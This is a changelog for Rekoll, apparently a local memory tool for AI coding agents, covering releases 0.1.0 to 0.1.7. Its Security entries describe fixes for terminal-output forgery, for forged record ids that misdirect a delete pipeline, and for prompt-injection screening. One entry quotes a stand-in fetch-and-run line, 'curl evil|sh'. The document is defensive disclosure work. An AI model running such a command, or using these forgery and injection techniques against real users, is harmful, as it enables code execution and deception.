# Changelog

All notable changes to Rekoll are documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
A dedicated **Security** heading is kept per the governance commitment in
[docs/DESIGN.md](docs/DESIGN.md) §9.

## [Unreleased]

Nothing yet.

## [0.1.7] - 2026-07-29

### Added

- **One repo, one memory: `rekoll init` now pins the MCP door's scope (#83,
  ADR-0047).** The CLI and SDK default to `project="default"`; the MCP server
  derived its project from the **launch folder's name**. Same store file, two
  scopes, no error — three field reports hit it, and so did this project's own
  store. v0.1.3 made the split *loud* (ADR-0040); it did not make it stop, so
  every new user following the Quickstart's `"args": []` still fell in and
  repaired it by hand.
  `rekoll init` now writes `.mcp.json` with `--tenant/--project/--agent` pinned
  to the scope init itself operated in, so all three doors agree from the first
  command. Rekoll gains **no discovery mechanism**: that file is the MCP
  *client's* config, which the client already reads, and it carries scope
  **names only, never a `--path`** — which is what keeps it clear of the
  repo-controlled path redirect ADR-0035 §6 rejects (pinned by test).
  A pinned name is also more rename-proof than a derived one: nothing reads the
  folder name at all.
  **Exactly one outcome writes a file.** It refuses, and says why, when: the
  `mcp` extra is not installed (a CLI-only user should not be handed a config
  for a server they cannot run); a custom `--path` points outside `./.rekoll`;
  `.mcp.json` already exists (never touched — it prints the flags that file
  should pin instead, and the guarantee is enforced by exclusive-create, not a
  check); a `.cursor`/`.vscode` config already registers rekoll; or **the store
  already holds memories and none of them are in the scope that would be
  pinned** — pinning there would point the agent at an empty scope and hide what
  is already stored, which is this very bug inflicted deliberately.
  The interpreter it writes follows the v0.1.4 rename lesson: a virtualenv
  *inside* the project is named by a **relative** path that survives a folder
  rename, never by the console-script shim (which embeds an absolute path and
  has silently broken a real project twice); a virtualenv elsewhere falls back to
  an absolute path and **says so out loud** rather than shipping a quiet time
  bomb.
  Existing split stores are unchanged — the ADR-0040 note already names them, and
  auto-stamping the one populated scope would override the operator's own flags.
  Never guess, never move data.

### Changed

- **Warn-don't-restrict has its own decision record (#120, ADR-0048).** The
  posture was already implemented in five places and cited **twelve times as
  "ADR-0033"**, which is the PII-redaction-tag decision — a wrong citation that
  spread by copy-paste because the principle it named had no record of its own.
  It now has a number and, more usefully, a stated **boundary**: it divides on
  *who is harmed by the choice*. A user may make their own data less safe,
  loudly informed; they may not unlock a defence, because the person harmed is
  not always the person choosing. The record also names the mixed case it does
  **not** resolve by lookup — a host who disables the ingest screen while
  redaction is on, where the PII in the text may be a third party's. Docs only,
  no behaviour change.

## [0.1.6] - 2026-07-29

### Changed

- **Rekoll now says what it is for: your project's decisions (#87).** A real
  12-hour, ~20-PR agent session stored 2,734 memories — 2,727 were code chunks
  and 7 were hand-written decisions, and the 7 carried all the recalled value.
  Agents already grep code faster than they can semantically recall it; what has
  no competitor is the *why* that never reaches source. So the README, Quickstart
  and MCP docs now lead with capturing decisions, and whole-repo `ingest` is
  presented as the opt-in extra it always was — **nothing is deprecated and no
  default changed.** `ingest`'s real job is named instead: it bulk-indexes the
  prose that explains decisions, and it is what lets a recalled memory point back
  at the file it came from. The paste-to-your-AI block in the README changed the
  most: saving a decision is now its own step, `ingest .` is explicitly optional
  with the ingest-from-the-repo-root rule attached (ADR-0042 §2 — a record's id
  derives from its path relative to the ingest root, so the root is normative for
  teams), and the standing instruction asks an agent to save a decision at the
  moment it is made.

### Security

- **Rekoll now owns its own wrap point on a terminal (#115, ADR-0046).** ADR-0044
  closed the *escape* half of the output-forgery class and v0.1.5 closed the
  *padding* half for single-line fields, but a soft-wrapped line always begins at
  column 0 — so until Rekoll put something of its own there, attacker-suppliable
  text could. Human output is now split to the terminal's width and every visual
  line after the first begins with a `|` marker at column 0. An attacker who
  types the marker into their own content gains nothing: theirs lands after the
  one Rekoll already emitted.
  **The width is measured in display columns, not characters** — the distinction
  is the fix, not a detail. `_display_content` deliberately preserves tabs and
  every printable non-ASCII character, so a character-counting wrap (including
  `textwrap`) is defeated by 38 CJK characters or 10 tabs, both of which produce
  a "short" line that the terminal renders as two; `textwrap` additionally
  rewrites stored content through its `expand_tabs`/`replace_whitespace`
  defaults. Both payloads are pinned by test, and the wrap is lossless — it
  reflows, it never truncates.
  This covers **both streams and every human surface**: recall hits and their
  detail line, `status`, `doctor`, the board, the scope-split note, the relevance
  footer, `remember`'s id line, and `init --wizard`'s echo of a stored rule —
  which was the one stored-content render ADR-0044 never reached, and now goes
  through the same filters as everything else.
  A stored newline is treated as the continuation it is, which closes two further
  ADR-0044 residuals: a line-leading `[2]` inside content, and U+2028/U+2029.
  **Scoped honestly: a redirected or piped stream is not wrapped**, by decision.
  Wrapping it would corrupt `recall --context` and break every script that
  consumes Rekoll's output, so `rekoll recall > out.txt; cat out.txt` still
  soft-wraps at display time and the original reproduction still succeeds there.
  ADR-0046 records that and the other residuals rather than claiming the class is
  shut. `--json`, `--context`, `--ids` and every MCP payload are byte-unchanged
  and never wrap, verified byte-for-byte against the published 0.1.5 wheel.
- ADR-0044 has been amended where it had become an **under**-claim, and the
  `cli.py` module rule and the `_display_content` / `_display_one_line`
  docstrings now describe what the code actually does. ADR-0044's recorded
  process failure was shipping a claim wider than its fix; leaving stale
  narrower ones behind would be the same failure with the sign flipped.

### Fixed

- `rekoll doctor` no longer trips CodeQL's clear-text-logging heuristic on a
  count of files containing secrets — it is a count, and it is now named and
  typed as one, so a value that cannot carry a secret stops being traced as if
  it could.

## [0.1.5] - 2026-07-29

### Fixed

- **The MCP server no longer breaks on a fresh install (#114, ADR-0045).** The
  `mcp` SDK's 2.0.0 release removed `mcp.server.fastmcp`, the module the server
  is built on, and Rekoll's `[mcp]` extra had no upper bound — so
  `pip install "rekoll[mcp]"` resolved straight to it and produced a server
  that exited at startup, telling you to install the extra you had just
  installed. Rekoll's flagship door was broken for every new install within
  hours of an upstream release nobody here triggered. The extra is now
  `mcp>=1.3,<2`, chosen at the actual break boundary rather than at a tested
  maximum, so 1.x point releases (including security fixes) still flow. The
  `mcp==1.3.0` floor is untouched and still CI-pinned.
- **An incompatible `mcp` now says so instead of blaming a missing extra.** The
  guard treated any `ImportError` out of `mcp.server.fastmcp` as "the extra
  isn't installed". It now names the installed version and the constraint, and
  gives both the pip and the pipx recovery. The probe reads packaging metadata
  and never imports `mcp`, so no third-party module-level code runs and the
  zero-dependency `import rekoll` path is unchanged. Its version check returns
  three answers, not two — supported, unsupported, and *could not tell* — so an
  unparseable version is never guessed at in either direction.
- **`rekoll doctor` grows an `mcp sdk` line.** Doctor reported MCP
  *registration* while staying silent about whether the server could *start*,
  so it printed a clean bill of health for exactly the machine state that broke
  every new install. The line WARNs when the installed SDK is outside the
  supported range and stays absent entirely when no `mcp` is installed — a
  CLI-only user never opened that door and is not nagged about it. It claims
  only what a metadata read establishes (the release is in range), never that
  the server will start, and a test pins the wording against that overclaim.
- **CI now watches the version ceiling, not just the floor.** The matrix pinned
  the minimum `mcp` and nothing at the other end, so the declared range drifted
  upward silently until it broke. A `test-mcp-latest` job now deliberately
  installs the newest `mcp` past the declared ceiling — non-blocking, because a
  new upstream major is news rather than a broken pull request — and a weekly
  run covers the case that actually happened: a major published *between* pull
  requests, with no CI run to notice.

### Security

- **Padded plain text can no longer forge a Rekoll output line (#112, ADR-0044
  amended).** v0.1.4 closed the *escape* half of this class and left the
  *padding* half open. Rekoll's human output is column-formatted, and the
  terminal — not Rekoll — decides where a visual line begins, so stored text
  padded with ordinary spaces started a **visual** line that read as Rekoll's
  own, using no control character at all. Reproduced on the shipped 0.1.4 wheel
  on both `rekoll doctor` (via a repo-committed `.mcp.json`) and `rekoll recall`
  (via a forged record id), where the forgery landed directly beneath a real
  check line in Rekoll's own column layout. Every single-line field that renders
  attacker-suppliable text is now filtered by what that field legitimately
  holds: ids, timestamps, embedder identities and versions admit no whitespace
  at all, while paths and commands collapse *runs* of whitespace so
  `C:\Program Files\...` still reads normally.
- **`rekoll recall --ids` can no longer be steered into deleting the wrong
  memory — one character wider than v0.1.4 fixed it.** That release removed the
  *newline* from ids because it split one line into two tokens, the second being
  another record's real id. But `xargs` splits on **any** whitespace: a single
  space in a forged id aimed the documented
  `recall --ids | xargs rekoll forget` pipeline at a memory the query never
  matched, with no control character involved. Ids now admit no whitespace at
  all, and a mangled one is still reported on stderr as possible direct-DB
  tampering.
- **Stored *content* is deliberately unchanged, and the gap is documented rather
  than papered over.** Ordinary single-spaced prose of the right length forges
  the same line with no run of whitespace anywhere — for content it is the
  terminal's soft wrap, not the padding, that starts the visual line. So
  collapsing whitespace there would deface every legitimately indented code
  snippet in a store and close nothing; a test pins both variants so nobody can
  "fix" content that way and call the class closed. The real closure — Rekoll
  owning its own wrap point — is tracked separately (#115). ADR-0044 now opens
  by saying it shipped incomplete, and retires one of its own residuals as
  unsound reasoning.
- `rekoll doctor` also bounds its reads of another install's `_version.py` and
  of a repo-committed `.mcp.json` — an oversized file in either place could hang
  the one command someone runs when everything is already broken — and no longer
  reports a non-executable file named `rekoll` as a competing install, a false
  alarm in the check whose whole job is not crying wolf.

## [0.1.4] - 2026-07-28

### Added

- **`rekoll doctor` now vouches for what it reports (ADR-0041).** Three field
  reports showed it printing a clean bill of health for machines it had not
  actually checked, so it gains two checks:
  - **Install identity (#104).** It names the exact copy it is speaking for and
    **WARNs when another rekoll on your PATH would answer instead** — a stale
    0.1.1 shadowing a fresh 0.1.3 made a careful tester file two bug reports
    against code they were not running, both already fixed in the version they
    thought they had. Versions of other copies are read from files, never by
    executing them (a diagnostic must not run arbitrary programs that happen to
    be named `rekoll`; a test pins this). Editable checkouts are recognized and
    never raise a false alarm, and copies whose version could not be read are
    reported as unread rather than assumed to agree.
  - **MCP registration (#84).** When a project-local `.mcp.json` (or
    `.cursor/mcp.json` / `.vscode/mcp.json`) registers rekoll, doctor WARNs if
    the config is invalid JSON, if its `command` or pinned `--path` no longer
    exists (this broke silently twice after folder renames), or if **nothing in
    this scope has ever been written through the MCP door** — the only signal
    that separates "configured and working" from "configured and never
    loaded", which once cost a 12-hour agent session. No line at all when no
    registration exists, so CLI-only users are never nagged.
- **`StorageAdapter.count_by_source()`** — a new optional, bounded storage read
  (concrete with a raising default, so out-of-tree adapters keep working)
  counting effective-active records in a scope by `provenance.source_uri`. It
  is what lets the MCP check answer "ever" exactly instead of inferring it from
  a recency window; an adapter that cannot serve it makes doctor weaken its own
  wording to "none of the 50 most recent" rather than over-claim.

### Changed

- **Docs: the first five minutes on a fresh machine (#102, #103, #85).** The
  Quickstart and README now say how to *get* `pipx` (it ships with no Python)
  and warn that you must open a **new terminal** afterwards — a freshly
  installed command isn't on the PATH of a shell that was already running, and
  a tester read that as a failed install. `docs/MCP.md` now makes
  `python -m rekoll.mcp_server` with a relative interpreter the documented
  default for a project virtualenv, because the `rekoll-mcp` console-script
  shim embeds an absolute path and breaks on rename.

### Security

- **Stored content can no longer drive your terminal (#98, ADR-0044).** A store
  is a file a repo can ship, and rows forged directly into one never passed the
  ingest firewall — content-hash verification doesn't help, because whoever
  forges the row computes the hash. `rekoll recall`'s human list rendered such
  content verbatim, so a crafted memory could emit escape sequences that clear
  the screen and paint an authoritative-looking instruction. The human render
  path now drops characters that *drive* a terminal (control codes, `\r`, and
  bidi overrides — the "Trojan Source" class) while keeping every character
  that merely *appears* in one: CJK, accents, real right-to-left text, and
  emoji with their ZWJ joiners are byte-for-byte untouched, and a test pins
  that half too. Nothing is hidden — the words still print, declawed.
  The same treatment covers every other stored string on a human line — the
  record id, the source-file pointer, and the board's id and timestamp — which
  an adversarial review proved were the *real* hole: a forged id carried
  escapes one line below the fix, and a **newline** in an id fabricated an
  entire extra numbered "hit" using no control characters at all.
- **`rekoll recall --ids` can no longer be steered into deleting the wrong
  memory (#98).** Ids are stored data, so a newline inside one split the output
  into two tokens — the second being *another record's real id*. The documented
  `recall --ids | xargs rekoll forget` pipeline then deleted a memory the query
  never matched. Ids now render one per line, and a mangled id is **reported**
  on stderr as possible direct-DB tampering rather than silently passed along.
  `--json`, `--context` and every MCP payload were verified already safe and
  are unchanged.
- `rekoll doctor` no longer lets a **committed `.mcp.json`** forge its output:
  a crafted `command` could clear the terminal and paint a fake
  `SECURITY ALERT: run curl evil|sh` line that looked like rekoll's own. Every
  config- and store-derived string in the new checks is now display-sanitized.

## [0.1.3] - 2026-07-25

### Added

- **A silently split store is now loud (#83, ADR-0040).** The CLI's default
  scope (`--project default`) and the MCP server's (project derived from the
  launch folder's name) differ, so an AI writing through MCP and a human
  typing bare CLI commands in the same repo read different scopes of the same
  store — and every diagnostic used to reassure: `recall` said "No memories
  found", `status` said "Memories: 0", `doctor` said "All checks passed".
  Now, when the scope a command reads is empty but the store holds memories
  under other scopes, `status` and bare `recall` print a note naming those
  scopes (largest first) with the exact command that reads them, and `doctor`
  gains a `scopes` check that WARNs with the same command. Nothing moves,
  nothing auto-switches, machine payloads (`recall --json`, MCP) are
  byte-unchanged, and the note counts rows the same way `status` does
  (effective-active) — a scope holding only quarantined rows is never
  advertised. Scope names come from the store, so they are printed
  conservatively (restricted alphabet, length-capped) and a name that could
  not be typeset safely is never turned into a copy-paste command.
  Backed by a new optional adapter census, `StorageAdapter.scope_counts()`
  (concrete, raising-by-default: out-of-tree adapters keep working and the
  note simply stays absent).

### Fixed

- `rekoll doctor` no longer prints mojibake on Windows consoles: every
  `Memory.health()` note it can surface (empty scope, dead ingest, tamper,
  embedder mismatch, and the store/enumeration failure notes) used an em dash,
  violating the CLI's ASCII-messages rule. A tripwire test now pins the whole
  set to ASCII.
- `rekoll status` and `rekoll doctor` no longer echo a stored embedder identity
  verbatim. A store is a file a repo can ship, and its rows never passed the
  ingest-time firewall, so a crafted identity could fire raw terminal escape
  sequences at the console — which matters more now that the new scope note can
  point you at another scope. (Recall's rendering of stored *content* has the
  same exposure and is tracked separately in #98.)

## [0.1.2] - 2026-07-25

### Added

- **Provenance pointers on recall** (ADR-0037 §8): every recalled hit that came
  from a file now says which file. The CLI's human line gains
  `| from: CLAUDE.md#4`, and the SDK (`RecallResult.sources()`), `recall --json`
  and the MCP `recall` tool gain a nullable `sources` list parallel to `ids` —
  `{"file", "chunk"}` per hit, `null` for a `remember`ed fact with no file.
  Correct a wrong memory where the truth lives instead of patching the index.
  `ContextEnvelope.render()` is byte-for-byte unchanged (ADR-0013). (#75, read half)
- **Honest relevance on `rekoll recall` (human door).** A recall now ends with one
  advisory line — how much of the scope came back and how close the closest memory
  was (`showing all 3 memories in scope | top similarity 0.46 - weak match; …`) —
  so a small store returning everything can't read as a confident answer. It
  informs, never filters: no hits are hidden, no default `--min-score` ships, and
  exit codes and the `--json`/MCP payloads are unchanged. The Quickstart gains a
  `--min-score` calibration recipe (ADR-0039, #73).

### Performance

- `recall()` no longer decodes the ~88 stored vectors per query that RRF fusion
  ranks away and discards; embeddings now materialize on first read. Recall p50
  is ~2x faster on a 1,000-record corpus (30.1 ms → 14.1 ms, bge-small) with
  bit-identical ranking (ADR-0038, #43).

### Fixed

- `ingest` no longer leaks compile-time warnings provoked by the *ingested*
  file's source (e.g. `SyntaxWarning: invalid escape sequence` on Python
  3.12+) into CLI/MCP output; rekoll's own warnings still surface (#89).
- `Memory.health()` stays fail-soft when a stored vector cannot be decoded: the
  record counts as not-embedded and earns a note naming possible tampering,
  instead of propagating a `ValueError` (found gating #43; ADR-0038).

## [0.1.1] - 2026-07-24

### Fixed

- `rekoll init` now creates the memory store file itself, so `rekoll status`
  (and `board`/`recall`) work immediately after setup instead of reporting
  "no memory store — run 'rekoll init'" (#71). `init` also now refuses a
  `--path` pointing at a non-rekoll SQLite database, and the no-store hints
  echo a custom `--path` so they can be followed verbatim.

### Changed

- Onboarding docs (#74): a project-root `.mcp.json` is documented beside the
  `claude` CLI hint (Claude Code's VS Code extension ships no CLI), install
  guidance is pipx-first with an honest SDK caveat, and docs/MCP.md is
  PyPI-first now that `pip install rekoll` is real.
- ADR-0037 designs the "memory + index" integration (#75) — tracked file
  sources, write-through `remember --to`, provenance pointers on recall.
  Design only: nothing is implemented, and a tripwire test pins DESIGN.md's
  wording to say so until it ships.

## [0.1.0] - 2026-07-24

The first public release — Rekoll is on PyPI: `pip install rekoll`.
Still pre-alpha in spirit: young, honest about its gaps, and built in the open
(1,250 tests across Linux/macOS/Windows on Python 3.10–3.13).

### Security

- **Injection firewall on by default.** Ingest-time screening redacts secrets,
  quarantines memory-poisoning / prompt-injection markers at low trust, and
  recall returns stored content inside a data envelope — handed to a model as
  DATA, never as instructions (ADR-0013).
- **Versioned attack corpus with a regression gate.** `benchmarks/attack_corpus.json`
  backs an attack-success-rate gate that may only go **down**, never up
  (ADR-0020).
- **Opt-in PII redaction.** Secrets (API keys, tokens, private-key blocks,
  database DSNs) are always redacted before storage; emails / US SSNs / phone
  numbers are redacted only when you enable `--redact-pii` (CLI) or
  `rekoll-mcp --redact-pii` / `REKOLL_MCP_REDACT_PII` (MCP). Redaction records a
  non-reversible audit tag, never the raw value (ADR-0022, ADR-0033).
- **Trust is monotonic.** An untrusted re-ingest can never downgrade a record's
  provenance or trust tier (ADR-0023); recall content-hash-verifies every
  candidate and withholds mismatches with a warning (ADR-0019).
- **Supply-chain posture.** All GitHub Actions are pinned to full commit SHAs,
  Dependabot proposes weekly bumps, and a `pip-audit` gate scans the full
  transitive closure of the optional extras people actually install
  (`[mcp]`, `[embeddings]`).

### Added

- `rekoll` CLI (`init`, `remember`, `recall`, `ingest`, `status`, `forget`,
  `doctor`) and the `Memory` Python facade — zero-config, local, private, no
  key and no LLM on the read path.
- Hybrid recall: local semantic + keyword search with optional cross-encoder
  reranking (the `[embeddings]` extra; falls back to a keyword stub when absent).
- MCP server exposing six tools (`remember`, `recall`, `ingest_path`,
  `forget`, `status`, `board`) over a project's private store (the `[mcp]` extra).
- Bring-your-own-database adapter contract with a SQLite adapter shipped by
  default, and bring-your-own-embedder / consolidator provider hooks.
- **Standing-directive channel** — a saved directive (e.g. "always explain
  simply") now **always** rides the recall envelope's instruction channel, on
  every recall, independent of the query and of the abstain gate — instead of
  surfacing only when it happened to rank into the top-k. A bounded
  (`max_pinned_directives`, default 5, `0` disables), deterministically ordered
  (oldest-first), deduplicated, tamper-verified, zero-LLM scoped read. Exposed as
  a new `directives` key on the SDK (`RecallResult.directives()`), CLI
  `recall --json`, and MCP `recall` — identical across all three doors — and as a
  new optional `StorageAdapter.active_directives` adapter method with its own
  conformance check (ADR-0034).
- **Live-project-board storage layer** (ADR-0035) — the shared current-state
  read for multiple concurrent AI sessions on one store: a trust-labeled
  activity feed (`recent_records`, effective-status gated — unlike `newest()`,
  which deliberately isn't), a curated majors/pending leg (`board_entries`,
  membership = a `board` metadata tag + the `TRUSTED_SOURCE` floor), an untorn
  one-transaction `board_snapshot`, and an atomic `set_status` resolve verb
  (marks SUPERSEDED, never deletes) — four new optional `StorageAdapter`
  methods with three conformance checks, plus `rekoll.board.build_board_payload`,
  the deterministic, tamper-verified, injection-neutralized payload every door
  will render.
- **Live-project-board SDK surface** (ADR-0035) — the `Memory` facade door onto
  that board: `mem.board()` returns a frozen `BoardResult` whose `to_dict()` is
  byte-identical to `build_board_payload`'s dict (so the SDK, CLI and MCP boards
  cannot drift), `mem.resolve(*ids)` marks board items done — ACTIVE →
  SUPERSEDED only, returning how many actually transitioned, never deleting —
  and `mem.remember(..., board="major"|"pending")` tags a curated item without
  changing its record id. The board is a free read: it builds no embedder and
  credits nothing to the was-it-used ledger. `BoardResult` and `BoardSnapshot`
  are exported from the package root.
- **Live-project-board doors** (ADR-0035) — the board now serves at every door,
  byte-identical (pinned by the three-doors parity suite). CLI: `rekoll board`
  (`--json` for scripts; `--recent/--majors/--rules` caps; an empty board exits
  0 — a status view, not a search), `rekoll resolve <id>...` (active →
  superseded only, never deletes; prints `Resolved N of M.` and exits 0 — a
  status verb), and `rekoll remember --board major|pending` (orthogonal to the
  standing-rule confirmation; below-floor and dual-leg cases get honest stderr
  notes). MCP: a sixth tool, `board`, with **zero arguments** — its leg caps
  are operator-only server config (`--board-recent/--board-majors/--board-rules`
  or `REKOLL_MCP_BOARD_*`; flags win, 0 disables a leg), so a calling model can
  never widen the board. Deliberately absent in v1: an MCP resolve tool and any
  board input on MCP `remember` — nothing model-transited can reach the curated
  tier. Sharing stays explicit: same `--path` AND the same scope triple at
  every door (docs/QUICKSTART.md documents the cross-door scope trap).
- Benchmark harness with a recall-quality regression gate over a sealed split.
- **Release workflow** (`.github/workflows/release.yml`) — publishes to PyPI via
  OIDC Trusted Publishing (no long-lived token to steal) on a published GitHub
  Release, with a manual TestPyPI dry-run path; SHA-pinned actions; the build
  job holds no publish credential and a guard refuses to publish when the
  release tag disagrees with `src/rekoll/_version.py`.

### Changed

- Version `0.0.0` → `0.1.0.dev0` — an honest in-development marker for the
  run-up to the first tagged release (`0.1.0` lands with the tag itself).

- CI `audit` job now audits the installed dependency closure of the optional
  extras (`.[dev,mcp,embeddings,bench]`) instead of the empty runtime-dep set of
  the bare project.
- CI `test` matrix now includes `macos-latest` on the core (zero-extra) suite.

### Fixed

- `SQLiteAdapter.set_status` now rolls back a failed multi-table sweep. A
  failure partway through could previously leave a matching `UPDATE` in an open
  transaction that the next unrelated write silently committed — a resolve that
  reported failure taking effect later, with the scan-cache patch never applied.
- The `[mcp]` extra declared `mcp>=1.2`, but the server's agent-guidance
  `instructions` string (the board polling-rhythm teaching handed over on
  initialize) needs `FastMCP(instructions=...)` and `InitializeResult.instructions`,
  which first exist in **mcp 1.3.0** — 1.2.x silently drops them. The floor is
  now `mcp>=1.3` and the CI floor cell installs `mcp==1.3.0`, so the declared
  minimum genuinely runs every shipped MCP feature. (Surfaced by the first
  public CI run; local dev already used a newer mcp, which is why it passed
  there.)
- The board payload's tamper warning counted a record once per leg while naming
  its id once, so a tampered curated major (which also rides the activity feed)
  was reported as "2 board record(s)" followed by a single id.
- Every repo link (README, QUICKSTART, pyproject `[project.urls]`, issue
  templates, MAINTAINERS) still pointed at the pre-transfer personal-account
  URL `ryankyleocampo-github/rekoll`; they now point at
  `rekreatedigital/rekoll` — the pyproject ones would have shipped as the PyPI
  project links.
- The README described `rekoll recall --json` as emitting 4 keys; the payload
  has 7. The sentence now enumerates them exactly, and a docs-consistency
  tripwire pins the README's list to the code so the next added key fails CI
  until the README names it.
- The battle-harness absolute ReDoS budgets are now true hang-backstops
  (10s / 45s, ≥10x the worst recorded trip) — the old 3.0s budget sat only ~2x over
  the marker-dense test's genuine ~1.5s runtime and tripped twice on loaded
  shared runners (2026-07-15, Windows and macOS) with every other cell green.
  Super-linear *scaling* stays caught by the runner-independent ratio gates.

[Unreleased]: https://github.com/rekreatedigital/rekoll/compare/v0.1.7...HEAD
[0.1.7]: https://github.com/rekreatedigital/rekoll/compare/v0.1.6...v0.1.7
[0.1.6]: https://github.com/rekreatedigital/rekoll/compare/v0.1.5...v0.1.6
[0.1.5]: https://github.com/rekreatedigital/rekoll/compare/v0.1.4...v0.1.5
[0.1.4]: https://github.com/rekreatedigital/rekoll/compare/v0.1.3...v0.1.4
[0.1.3]: https://github.com/rekreatedigital/rekoll/compare/v0.1.2...v0.1.3
[0.1.2]: https://github.com/rekreatedigital/rekoll/compare/v0.1.1...v0.1.2
[0.1.1]: https://github.com/rekreatedigital/rekoll/compare/v0.1.0...v0.1.1
[0.1.0]: https://github.com/rekreatedigital/rekoll/releases/tag/v0.1.0
